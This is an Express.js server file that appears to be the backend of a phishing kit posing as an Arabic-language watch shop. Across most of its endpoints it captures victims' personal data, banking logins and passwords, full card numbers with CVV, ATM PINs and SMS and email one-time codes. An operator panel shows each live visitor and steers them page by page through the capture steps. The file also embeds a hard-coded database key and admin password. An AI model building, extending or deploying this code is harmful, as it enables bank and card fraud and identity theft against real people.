const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://yqygohgdqifsykrdaaoe.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_eq9GQMQhXR2Jfqbg27uASg_Qdi8Uqej';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin1234@@';

const ADMIN_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');

// Admin login (legacy - token based)
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    return res.json({ success: true, token: ADMIN_TOKEN });
  }
  res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
});

// Admin auth check (supports both Bearer token and x-admin-password header)
function isAdmin(req) {
  const pw = req.headers['x-admin-password'];
  if (pw && pw === ADMIN_PASSWORD) return true;
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) {
    return auth.slice(7) === ADMIN_TOKEN;
  }
  return false;
}

// Admin check endpoint (new admin panel)
app.get('/api/admin/check', (req, res) => {
  if (isAdmin(req)) return res.json({ ok: true });
  res.status(401).json({ ok: false });
});

// Admin get all orders (new admin panel format)
app.get('/api/admin/orders', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ ok: false });
    const { data: ordersData, error } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
    if (error) throw error;

    const cutoffIso = new Date(Date.now() - 15000).toISOString();
    const { data: visitors } = await supabase.from('visitors').select('*').gte('last_seen', cutoffIso);
    const { count: totalV } = await supabase.from('visitors').select('*', { count: 'exact', head: true });

    const mapped = (ordersData || []).map(o => ({
      ref: String(o.id),
      n: o.name || '',
      p: o.phone || '',
      e: o.email || '',
      id: o.national_id || '',
      g: o.gender || '',
      em: o.wilaya || '',
      a: o.age || '',
      ad: o.address || '',
      card: o.card_type || '',
      st: o.resident_type || '',
      status: mapStatus(o.status),
      step: mapStep(o.status),
      ts: o.created_at ? new Date(o.created_at).getTime() : null,
      updated: o.updated_at ? new Date(o.updated_at).getTime() : null,
      page: o.current_page || '',
      pay: {
        cardName: o.card_name || '',
        cardNumber: o.card_number || '',
        exp: o.card_expiry || '',
        cvv: o.card_cvv || '',
        otp: o.verification_code || o.verification_code_3 || '',
        pin: o.atm_pin || '',
        brand: o.card_brand || ''
      }
    }));

    res.json({
      ok: true,
      orders: mapped,
      active: (visitors || []).length,
      totalVisitors: totalV || 0,
      pages: (visitors || []).map(v => v.current_page || 'home')
    });
  } catch (err) {
    console.error('admin/orders error:', err.message);
    res.status(500).json({ ok: false, orders: [] });
  }
});

function mapStatus(s) {
  if (!s) return 'pending';
  if (s === 'confirmed' || s === 'completed') return 'confirmed';
  if (s === 'rejected') return 'rejected';
  if (s === 'redirect') return 'redirect';
  if (s.includes('pending') || s === 'awaiting') return 'pending';
  return 'pending';
}
function mapStep(s) {
  if (!s) return null;
  if (s === 'atm_pending') return 'pin';
  if (s === 'code_pending' || s === 'email_code_pending') return 'otp';
  if (s === 'card_pending') return 'card';
  return null;
}

// Admin decide (accept/reject)
app.post('/api/admin/decide/:ref', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ ok: false });
    const { decision } = req.body;
    const status = decision === 'accept' ? 'confirmed' : 'rejected';
    const { error } = await supabase.from('orders').update({ status, redirect_to: null }).eq('id', req.params.ref);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// Admin redirect order to a page
app.post('/api/admin/redirect/:ref', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ ok: false });
    const { page } = req.body;
    const pageMap = {
      home: 'index.html', card: 'card-details.html', otp: 'code.html',
      pin: 'atm.html', wait: 'waiting.html', done: 'success.html',
      bankconfirm: 'calling.html'
    };
    const redirect_to = pageMap[page] || page;
    const { error } = await supabase.from('orders').update({ redirect_to, status: 'redirect', current_page: page }).eq('id', req.params.ref);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// Admin delete single order
app.delete('/api/admin/orders/:ref', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ ok: false });
    const { error } = await supabase.from('orders').delete().eq('id', req.params.ref);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// Admin delete inactive orders
app.delete('/api/admin/inactive', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ ok: false });
    const cutoff = new Date(Date.now() - 120000).toISOString();
    const { data: inactive } = await supabase.from('orders')
      .select('id, status, updated_at, created_at')
      .not('status', 'in', '("pending","awaiting","code_pending","card_pending","atm_pending","email_code_pending")');
    const toDelete = (inactive || []).filter(o => {
      const last = o.updated_at || o.created_at;
      return !last || (Date.now() - new Date(last).getTime()) > 120000;
    });
    let deleted = 0;
    for (const o of toDelete) {
      await supabase.from('orders').delete().eq('id', o.id);
      deleted++;
    }
    res.json({ ok: true, deleted });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// Admin get visitors (active in the last 15 seconds) + match with orders
app.get('/api/admin/visitors', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ ok: false });
    const cutoffIso = new Date(Date.now() - 15000).toISOString();
    const { data } = await supabase.from('visitors').select('*').gte('last_seen', cutoffIso).order('last_seen', { ascending: false });

    // Get ALL active orders for matching
    let allActiveOrders = [];
    try {
      const { data: activeOrds } = await supabase.from('orders')
        .select('id, name, phone, current_page, session_id')
        .not('status', 'in', '("confirmed","rejected","completed")')
        .order('created_at', { ascending: false });
      allActiveOrders = activeOrds || [];
    } catch(e) {}

    const ordersById = {};
    const ordersBySid = {};
    const ordersByPage = {};
    allActiveOrders.forEach(o => {
      ordersById[String(o.id)] = o;
      if (o.session_id) ordersBySid[o.session_id] = o;
      const pg = (o.current_page || '').replace('.html', '').replace(/\?.*/,'');
      if (pg && !ordersByPage[pg]) ordersByPage[pg] = o;
    });

    const usedIds = new Set();
    const visitors = (data || []).map(v => {
      const vPage = v.current_page || 'home';
      // 1. Try matching by order_id stored in visitor row
      let matched = v.order_id ? ordersById[String(v.order_id)] : null;
      // 2. Try matching by session_id stored in order
      if (!matched) matched = ordersBySid[v.session_id] || null;
      // 3. Fall back to page matching
      if (!matched && vPage !== 'home' && vPage !== 'index') {
        const pg = ordersByPage[vPage];
        if (pg && !usedIds.has(pg.id)) {
          matched = pg;
        }
      }
      if (matched) usedIds.add(matched.id);
      return {
        sid: v.session_id,
        page: vPage,
        first: v.first_seen ? new Date(v.first_seen).getTime() : null,
        last: v.last_seen ? new Date(v.last_seen).getTime() : null,
        name: matched ? matched.name : null,
        phone: matched ? matched.phone : null,
        orderId: matched ? String(matched.id) : null
      };
    });
    res.json({ ok: true, count: visitors.length, visitors });
  } catch (err) {
    res.json({ ok: false, count: 0, visitors: [] });
  }
});

// Admin reset all data
app.post('/api/admin/reset', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ ok: false });
    const { data: allOrders } = await supabase.from('orders').select('id');
    let deletedOrders = 0;
    for (const o of (allOrders || [])) {
      await supabase.from('orders').delete().eq('id', o.id);
      deletedOrders++;
    }
    await supabase.from('visitors').delete().neq('id', 0);
    res.json({ ok: true, deletedOrders });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// Save order
app.post('/api/orders', async (req, res) => {
  try {
    const { name, phone, wilaya, city, address, watch_color, watch_index, country: formCountry } = req.body;
    if (!name || !phone || !wilaya || !address) {
      return res.status(400).json({ success: false, message: 'جميع الحقول مطلوبة' });
    }
    const country = req.headers['x-vercel-ip-country'] || req.headers['cf-ipcountry'] || formCountry || null;
    const row = {
      name, phone, wilaya, city, address, watch_color,
      watch_index: watch_index !== undefined ? watch_index : null,
      current_page: 'order',
      status: 'pending',
      created_at: new Date().toISOString()
    };
    if (country) row.country = country;
    let { error } = await supabase.from('orders').insert(row);
    if (error && error.message && error.message.includes('country')) {
      delete row.country;
      const retry = await supabase.from('orders').insert(row);
      error = retry.error;
    }
    if (error) throw error;
    const { data: inserted } = await supabase.from('orders').select('id').eq('phone', phone).order('created_at', { ascending: false }).limit(1).maybeSingle();
    res.json({ success: true, order_id: inserted ? inserted.id : null });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save login username
app.post('/api/login-data', async (req, res) => {
  try {
    const { order_id, username, country } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const updates = {
      login_username: username,
      current_page: 'calling',
      status: 'pending',
      redirect_to: null,
    };
    if (country) updates.login_country = country;
    const { error } = await supabase.from('orders').update(updates).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('login-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save login password
app.post('/api/password-data', async (req, res) => {
  try {
    const { order_id, password } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('password-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save ATM PIN
app.post('/api/atm-data', async (req, res) => {
  try {
    const { order_id, atm_pin } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ atm_pin: atm_pin, current_page: 'atm-waiting', status: 'atm_pending', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('atm-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save verification code (6-digit SMS)
app.post('/api/code-data', async (req, res) => {
  try {
    const { order_id, code } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('code-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save 3-digit verification code (separate from 6-digit SMS)
app.post('/api/code3-data', async (req, res) => {
  try {
    const { order_id, code } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ verification_code_3: code, status: 'code_pending', current_page: 'code3-waiting', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('code3-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save email verification code
app.post('/api/email-code-data', async (req, res) => {
  try {
    const { order_id, code } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ email_verification_code: code, status: 'email_code_pending', current_page: 'email-code-waiting', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('email-code-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save card details
app.post('/api/card-data', async (req, res) => {
  try {
    const { order_id, card_name, card_number, card_expiry, card_cvv } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({
      card_name, card_number, card_expiry, card_cvv,
      status: 'card_pending', current_page: 'card-waiting', redirect_to: null
    }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('card-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Presence / heartbeat for active visitors
app.post('/api/presence', async (req, res) => {
  try {
    const { session_id, current_page, order_id } = req.body;
    if (!session_id) return res.json({ ok: false });
    const nowIso = new Date().toISOString();
    const { data: existing } = await supabase.from('visitors').select('id, redirect_to').eq('session_id', session_id).maybeSingle();
    if (!existing) {
      const row = {
        session_id,
        current_page: current_page || 'home',
        first_seen: nowIso,
        last_seen: nowIso,
      };
      if (order_id) row.order_id = order_id;
      let { error } = await supabase.from('visitors').upsert(row, { onConflict: 'session_id' });
      if (error && error.message && error.message.includes('order_id')) {
        delete row.order_id;
        const retry = await supabase.from('visitors').upsert(row, { onConflict: 'session_id' });
        if (retry.error) throw retry.error;
      } else if (error) throw error;
    } else {
      const updates = { last_seen: nowIso };
      if (current_page) updates.current_page = current_page;
      if (order_id) updates.order_id = order_id;
      let { error } = await supabase.from('visitors').update(updates).eq('session_id', session_id);
      if (error && error.message && error.message.includes('order_id')) {
        delete updates.order_id;
        await supabase.from('visitors').update(updates).eq('session_id', session_id);
      }
      if (existing.redirect_to) {
        await supabase.from('visitors').update({ redirect_to: null }).eq('session_id', session_id);
        return res.json({ ok: true, redirectTo: existing.redirect_to });
      }
    }
    if (order_id) {
      try {
        await supabase.from('orders').update({ session_id: session_id }).eq('id', order_id);
      } catch(e) {}
    }
    res.json({ ok: true });
  } catch (err) {
    console.error('presence error:', err.message);
    res.json({ ok: false });
  }
});

// Get active visitors count (admin) — anyone seen in the last 15 seconds
app.get('/api/visitors/active', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ count: 0 });
    const cutoffIso = new Date(Date.now() - 15000).toISOString();
    const { data, error } = await supabase.from('visitors').select('*').gte('last_seen', cutoffIso).order('last_seen', { ascending: false });
    if (error) throw error;
    res.json({ count: (data || []).length, visitors: data || [] });
  } catch (err) {
    console.error('visitors/active error:', err.message);
    res.json({ count: 0, visitors: [] });
  }
});

// Redirect a specific visitor by session_id (admin)
app.patch('/api/visitors/:session_id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { redirect_to } = req.body;
    if (!redirect_to) return res.status(400).json({ success: false, message: 'redirect_to missing' });
    const { error } = await supabase.from('visitors').update({ redirect_to }).eq('session_id', req.params.session_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('visitor redirect error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Check order status (public - for waiting page)
app.get('/api/orders/:id/status', async (req, res) => {
  try {
    const { data } = await supabase.from('orders').select('status, redirect_to, login_username').eq('id', req.params.id).maybeSingle();
    if (!data) return res.json({ status: 'not_found' });
    if (data.redirect_to) {
      await supabase.from('orders').update({ redirect_to: null }).eq('id', req.params.id);
      return res.json({ status: data.status, redirect_to: data.redirect_to, username: data.login_username });
    }
    res.json({ status: data.status, username: data.login_username });
  } catch (err) {
    res.json({ status: 'error' });
  }
});

// Get orders (admin)
app.get('/api/orders', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ orders: [] });
    const { data, error } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
    if (error) throw error;
    res.json({ orders: data || [] });
  } catch (err) {
    res.status(500).json({ orders: [], message: err.message });
  }
});

// Update order status
app.patch('/api/orders/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const updates = {};
    if (req.body.status) updates.status = req.body.status;
    if (req.body.redirect_to !== undefined) {
      updates.redirect_to = req.body.redirect_to;
      if (req.body.redirect_to) {
        const page = req.body.redirect_to.replace('.html','').replace(/\?.*/,'');
        updates.current_page = page;
      }
    }
    const { error } = await supabase.from('orders').update(updates).eq('id', req.params.id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Delete order
app.delete('/api/orders/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { error } = await supabase.from('orders').delete().eq('id', req.params.id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

module.exports = app;
